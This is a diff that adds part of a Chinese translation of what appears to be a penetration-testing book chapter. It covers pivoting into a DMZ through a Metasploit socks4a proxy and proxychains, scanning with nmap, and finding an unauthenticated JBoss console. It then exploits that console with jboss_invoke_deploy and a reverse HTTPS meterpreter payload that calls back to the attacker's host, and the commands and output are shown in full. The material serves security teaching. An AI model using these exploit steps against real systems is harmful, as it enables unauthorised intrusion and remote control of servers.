@@ -269,5 +269,142 @@ msf auxiliary(tcp) > run
 [*] 192.168.1.46:80 - TCP OPEN
 [*] Auxiliary module execution completed
 ```
-stop at P25
+很好。但是 metasploit 的扫描工具跟nmap这种传统工具比起来，还是太慢、太不稳定了。此外，若能在蓝区的机器上运行第三方工具，甚至是手写的脚本肯定会更好。
 
+为实现这个目标，需要使用到 **auxiliary/server/socks4a** 模块。 它在 Front Gun 服务器开启本地端口，所有发送到该端口的数据包都会自动转发到我们先前添加的 meterpreter 的会话（发送到 192.168.1.0/24 的数据包都会到会话1）中：
+```
+msf auxiliary(tcp)> use auxiliary/server/socks4a 
+msf auxiliary(tcp)> set SRVPORT 9999 
+SRVPORT => 9999
+msf auxiliary(tcp)> set SRVHOST 127.0.0.1 
+SRVHOST => 127.0.0.1
+msf auxiliary(tcp)> run
+[*] Auxiliary module execution completed
+[*] Starting the socks4a proxy server
+```
+为了将所有工具的输出，都转发到我们刚才创建的隧道中，需要再次使用 proxychains 工具：
+```
+[ProxyList]
+61 # add proxy here ... 62 # meanwile
+63 # defaults set to "tor"
+64 #socks4	127.0.0.1 9050
+65 socks4	127.0.0.1 9999
+```
+注意， metasploit 在Front Gun 服务器开启了 9999 端口， 和我们先前部署的 socks 代理相反。
+
+然后，通过 proxychains 运行 nmap，用下面的命令:
+```
+frontGun$ proxychains nmap -sT 192.168.1.0/24
+```
+
+{% hint style="info" %}
+**建议**
+我们也可以使用 SSH 来转发所有端口，这篇博客中有详细介绍：https://highon.coffee/blog/ssh- meterpreter-pivoting-techniques/
+{% endhint %}
+
+## 3.4 四处晃晃
+当我们可以访问公共 DMZ 区的其他服务器之后，可以探索下该区域都有哪些服务和应用。当前位于 C 类网络中，可以轻易扫描整个网络范围（0-255)。在此，咱们先简单的探测下常用端口：
+```
+FrontGun$ proxychains nmap -F -n 192.168.1.0/24 -oA dmz_scan
+-n does not resolve DNS names
+-F scans only the 100 most common ports
+-oA writes the results to a local file
+```
+通过扫描结果来寻找“软柿子”，也就是可以被轻松提权执行代码的目标。
+
+### 3.4.1 孤独的(J)Boss
+跟预期的一样，该区域看起来有大量的 web 服务。大部分通过浏览互联网就能访问到；但是，我们终究是在**公网**。有些服务在先前的互联网扫描中并未被发现，这就是**中间件控制台**。
+
+{% hint style="info" %}
+**何为中间件**
+中间件是一个组件，用来承载更高级别的应用，处理一些基本任务，例如排程、优先级、资源缓存、清理内存等等。Apache 就是一种承载网站的中间件。更精准的例子应该数 Java 中间件家族：JBoss、Tomcat、Jenkins等等。
+
+作为黑客，让我们感兴趣的是这些中间件都有管理控制台，供开发者用来发布新的应用和升级已有应用，例如 CMS（译注：内容管理系统）。如果我们可以控制中间件，就能发布新的应用，从而在服务器上执行任意代码。
+{% endhint %}
+
+利用 **grep** 命令来查找 nmap 扫描结果中开放了 8080/8443/8081/8888 端口的服务器。这些可能通常对应 Jboss/Tomcat/Jenkins 等中间件。
+```
+root@kali:~/book# grep -e "\ (8080\|8443\|8081\|8888\).*open" dmz_scan.gnmap |sed - r 's/,/\n/g'
+Host: 192.168.1.70 ()
+Ports: 
+135/open/tcp//msrpc///
+139/open/tcp//netbios-ssn///
+445/open/tcp//microsoft-ds///
+1026/open/tcp//LSA-or-nterm///
+8009/open/tcp//ajp13///
+8080/open/tcp//http-proxy///
+```
+通过 proxychains 启动Firefox，就能开心的看到 JBoss 主页了：
+
+![JBoss主页图](./Chap3/3.4-1.png)
+
+访问 JMX 控制台，也就是 JBoss 的管理面板。看到没，不需要提供任何凭证，就能访问所有内容了。毕竟，“聪明”的管理员认为没有人可以访问 DMZ，是不是?
+
+让 JAVA 中间件如此容易成为攻击目标的原因在于，它有太多控制台了： JMX 控制台、Web控制台、JmxInvokerServerlet等等，这还只是传统 HTTP 协议的控制台，其他特殊协议，例如RMI也有。
+
+要确保所有东西都锁好，势必是需要做额外功的，但是当人们搭建测试服务器之后，就懒得再遵照安全守则操作了。他们会等服务器运行6个月，就认为万事大吉了。到那个时候，谁都不会记得这个管理面板的存在，或者只是指望其他人做了安全加固。
+
+不管怎样，我们可以编写一个生成反弹 shell 的 Java 应用，打成**War**包，部署到 JBoss 服务器上，静静等到远程代码被执行。这一步操作也可以通过 metasploit 的**jboss_invoke_deply** 模块实现自动化：
+```
+FrontGun$ msfconsole
+msf > use exploit/multi/http/jboss_invoke_deploy
+
+msf exploit(jboss_invoke_deploy) > set RHOST 192.168.1.70
+RHOST => 192.168.1.70
+
+msf exploit(jboss_invoke_deploy) > set payload java/meterpreter/reverse_https
+payload => java/meterpreter/reverse_https
+
+msf exploit(jboss_invoke_deploy) > set LHOST Front_Gun_IP
+LHOST => 192.168.1.11
+
+msf exploit(jboss_invoke_deploy) > set LPORT 443 
+LPORT => 443
+
+msf exploit(jboss_invoke_deploy) > exploit
+
+[*] Started HTTPS reverse handler on https://0.0.0.0:443/
+[*] Attempting to automatically select a target
+[*] Attempting to automatically detect the platform 
+[*] Attempting to automatically detect the architecture
+[*] Automatically selected target: "Windows Universal" 
+[*] Deploying stager
+[*] Calling stager: /zUAfKRBBvtYsET/leNHaWyjhUmSLo.jsp 
+[*] Uploading payload through stager
+[*] Calling payload: /polZSMHIz/wUnOCfzZtVIa.jsp 
+[*] Removing payload through stager
+[*] Removing stager
+[*] 192.168.1.70:1129 (UUID:c6980ba710d8ffe7/java=17/java=4/2016-12- 24T17:40:04Z) Staging Java payload ...
+[*] Meterpreter session 1 opened (Front_Gun_IP:443 -> 192.168.1.70:1129) at 2016-12-24 18:40:05 +0100
+
+meterpreter > getuid
+Server username: jboss_svc
+```
+已经很接近了！**jboss_svc**用户不具备管理员权限，这在运行JBOSS的Windows服务器上很少见。通常情况下，我们直接能获取到 SYSTEM 权限，看起来服务器做了某种方式的加固。
+```
+meterpreter > shell 
+Process 2 created.
+Microsoft Windows [Version 5.2.3790]
+(C) Copyright 1985-2003 Microsoft Corp.
+C:\jboss-6.0.0.M1\bin>net localgroup "administrators" 
+
+net localgroup "administrators" Members
+
+-------------------------------------------------------
+admin_svc 
+Administrator
+The command completed successfully.
+```
+进一步探测可以发现，这是一台 windows 2003 sp3 服务器，有三个本地用户。你的第一反应肯定是：“操作系统太老了，我们有 N 种姿势来获取管理员权限！”说的很对，但我们不可能总是这么幸运，所以接下来我会介绍一些获取 windows 服务器的经典方法。这些方法更快、更隐蔽，而且，99%的情况下都有效。
+
+
+{% hint style="info" %}
+**建议**
+更懒的做法是，直接运行 /post/multi/recon/local_exploit_suggester 模块，来看看哪些方法适用于你的环境。
+
+{% endhint %}
+
+### 3.4.2 跌宕起伏
+
+----------------
+stop at page 33. 20191020
